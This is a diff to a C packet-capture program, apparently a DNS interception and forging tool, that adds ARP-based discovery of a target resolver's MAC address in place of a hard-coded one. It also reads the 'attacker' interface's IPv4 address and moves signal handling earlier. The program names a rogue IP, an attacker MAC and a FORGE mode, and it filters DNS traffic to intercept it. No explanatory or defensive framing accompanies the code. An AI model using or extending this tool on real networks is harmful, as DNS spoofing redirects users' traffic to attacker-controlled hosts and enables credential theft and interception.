@@ -3,11 +3,16 @@
 #include <string.h>
 #include <unistd.h>
 #include <signal.h>
+#include <time.h>
 #include <pcap.h>
 #include <arpa/inet.h>
 #include <netinet/ip.h>
 #include <netinet/udp.h>
 #include <net/ethernet.h>
+#include <net/if_arp.h>
+#include <ifaddrs.h>
+#include <sys/socket.h>
+#include <netpacket/packet.h>
 
 #define MAX_PKT_SIZE 2048
 
@@ -15,10 +20,13 @@ static volatile sig_atomic_t keep_running = 1;
 static int forge_mode = 0;
 static const char *target_qname = "example.com";
 static const char *rogue_ip_str = "172.16.1.30";
+static const char *resolver_ip_str = "172.16.2.10";
 static uint32_t rogue_ip_n;
+static uint32_t resolver_ip_n;
+static uint32_t attacker_ip_n;
 static pcap_t *handle = NULL;
 
-static uint8_t resolver_mac[6] = {0x62, 0xdc, 0xc3, 0x52, 0xce, 0x78};
+static uint8_t resolver_mac[6];
 static uint8_t attacker_mac[6];
 
 static void sig_handler(int signum) {
@@ -238,6 +246,72 @@ static void packet_handler(u_char *user, const struct pcap_pkthdr *hdr, const u_
     }
 }
 
+/* ---------- interface address helper ------------------------------------- */
+
+/* Fill attacker_ip_n with this host's IPv4 address on eth0 (needed as the
+ * ARP request's sender-protocol-address field). The MAC is already read
+ * separately via /sys/class/net, below, before this is called. */
+static int load_attacker_ip(void) {
+    struct ifaddrs *ifap = NULL, *ifa;
+    int got = 0;
+    if (getifaddrs(&ifap) != 0) return -1;
+    for (ifa = ifap; ifa; ifa = ifa->ifa_next) {
+        if (!ifa->ifa_addr || strcmp(ifa->ifa_name, "eth0") != 0) continue;
+        if (ifa->ifa_addr->sa_family == AF_INET) {
+            attacker_ip_n = ((struct sockaddr_in *)ifa->ifa_addr)->sin_addr.s_addr;
+            got = 1;
+        }
+    }
+    freeifaddrs(ifap);
+    return got ? 0 : -1;
+}
+
+struct arp_pkt {
+    struct ether_header eth;
+    uint16_t htype, ptype;
+    uint8_t  hlen, plen;
+    uint16_t oper;
+    uint8_t  sha[6]; uint8_t spa[4];
+    uint8_t  tha[6]; uint8_t tpa[4];
+} __attribute__((packed));
+
+/* Resolve resolver_ip_n's MAC via ARP, on the already-open, not-yet-filtered
+ * `handle`. Must run before pcap_setfilter() restricts capture to UDP/53,
+ * since ARP replies would otherwise never reach us. Returns 0 on success. */
+static int arp_resolve_resolver(void) {
+    for (int attempt = 0; attempt < 20 && keep_running; attempt++) {
+        struct arp_pkt req;
+        memset(&req, 0, sizeof(req));
+        memset(req.eth.ether_dhost, 0xFF, 6);
+        memcpy(req.eth.ether_shost, attacker_mac, 6);
+        req.eth.ether_type = htons(ETHERTYPE_ARP);
+        req.htype = htons(ARPHRD_ETHER);
+        req.ptype = htons(ETHERTYPE_IP);
+        req.hlen = 6; req.plen = 4;
+        req.oper = htons(ARPOP_REQUEST);
+        memcpy(req.sha, attacker_mac, 6);
+        memcpy(req.spa, &attacker_ip_n, 4);
+        memcpy(req.tpa, &resolver_ip_n, 4);
+        pcap_sendpacket(handle, (const u_char *)&req, sizeof(req));
+
+        time_t start = time(NULL);
+        while (time(NULL) - start < 1 && keep_running) {
+            struct pcap_pkthdr *h;
+            const u_char *p;
+            int rc = pcap_next_ex(handle, &h, &p);
+            if (rc != 1) continue;
+            if (h->caplen < sizeof(struct arp_pkt)) continue;
+            const struct arp_pkt *rep = (const struct arp_pkt *)p;
+            if (ntohs(rep->eth.ether_type) != ETHERTYPE_ARP) continue;
+            if (ntohs(rep->oper) != ARPOP_REPLY) continue;
+            if (memcmp(rep->spa, &resolver_ip_n, 4) != 0) continue;
+            memcpy(resolver_mac, rep->sha, 6);
+            return 0;
+        }
+    }
+    return -1;
+}
+
 int main(int argc, char **argv) {
     if (argc > 1 && strcmp(argv[1], "--forge") == 0) {
         forge_mode = 1;
@@ -246,6 +320,7 @@ int main(int argc, char **argv) {
     }
 
     inet_pton(AF_INET, rogue_ip_str, &rogue_ip_n);
+    inet_pton(AF_INET, resolver_ip_str, &resolver_ip_n);
 
     FILE *f = fopen("/sys/class/net/eth0/address", "r");
     if (f) {
@@ -255,12 +330,18 @@ int main(int argc, char **argv) {
         }
         fclose(f);
     }
+    if (load_attacker_ip() != 0) {
+        fprintf(stderr, "could not read IPv4 address of eth0\n");
+        return 1;
+    }
 
     printf("Starting DNS Interceptor [%s mode] on eth0...\n", forge_mode ? "FORGE" : "RELAY");
-    printf("Attacker MAC: %02x:%02x:%02x:%02x:%02x:%02x | Target Resolver MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
-           attacker_mac[0], attacker_mac[1], attacker_mac[2], attacker_mac[3], attacker_mac[4], attacker_mac[5],
-           resolver_mac[0], resolver_mac[1], resolver_mac[2], resolver_mac[3], resolver_mac[4], resolver_mac[5]);
+    printf("Attacker MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
+           attacker_mac[0], attacker_mac[1], attacker_mac[2], attacker_mac[3], attacker_mac[4], attacker_mac[5]);
     fflush(stdout);
+
+    signal(SIGINT, sig_handler);
+    signal(SIGTERM, sig_handler);
 
     char errbuf[PCAP_ERRBUF_SIZE];
     handle = pcap_open_live("eth0", MAX_PKT_SIZE, 1, 1, errbuf);
@@ -269,15 +350,23 @@ int main(int argc, char **argv) {
         return 1;
     }
 
+    /* Discover the resolver's real MAC by ARP -- nothing hard-coded. Must
+     * happen before the UDP/53-only filter is installed below. */
+    if (arp_resolve_resolver() != 0) {
+        fprintf(stderr, "ARP resolution of %s failed; is the route diverted?\n", resolver_ip_str);
+        pcap_close(handle);
+        return 1;
+    }
+    printf("Target Resolver MAC: %02x:%02x:%02x:%02x:%02x:%02x (resolved via ARP)\n",
+           resolver_mac[0], resolver_mac[1], resolver_mac[2], resolver_mac[3], resolver_mac[4], resolver_mac[5]);
+    fflush(stdout);
+
     struct bpf_program fp;
     if (pcap_compile(handle, &fp, "udp and port 53", 1, PCAP_NETMASK_UNKNOWN) == -1) {
         fprintf(stderr, "pcap_compile failed: %s\n", pcap_geterr(handle));
         return 1;
     }
     pcap_setfilter(handle, &fp);
-
-    signal(SIGINT, sig_handler);
-    signal(SIGTERM, sig_handler);
 
     pcap_loop(handle, -1, packet_handler, NULL);
 
